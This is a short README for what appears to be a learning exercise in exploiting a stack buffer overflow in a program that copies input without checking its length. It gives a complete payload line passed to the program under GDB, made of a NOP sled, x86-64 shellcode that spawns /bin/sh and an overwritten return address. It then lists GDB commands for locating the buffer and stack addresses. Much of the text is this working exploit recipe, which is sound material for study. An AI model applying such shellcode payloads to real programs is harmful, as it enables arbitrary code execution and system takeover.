# Buffer-Overflow-Exploit

This program is an exploit of a known vulnerability called Buffer Exploit.
It uses the fact that the program does not check the input's legnth before storing it in the memory.
To expolit that, we provide a shellcode input - 
run $(python -c "print('\x90'*100 +'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' +'\x90'*140 + '\x38\xdd\xff\xff\xff\x7f')")

Small changes may be required, because the goal is that '\x38\xdd\xff\xff\xff\x7f' (jump command) will be injected into the $rsp register.
Using Linux GDB, we can find the exact address of the chars array that allocated ,and the address of $rsp, and use it for the small changes in the imput that we provide.

Useful gdb commands for this task - 
1. disas main - to watch the vulnerable assembly code.
2. break 0x - to put breakpoint after the strcpy command and see where the array is allocated - so we can jump there with the shellcode.
3. x/200xb $rsp - to examine 200 bytes of the memory, from $rsp forward.
4. run input - to run the program with some input.
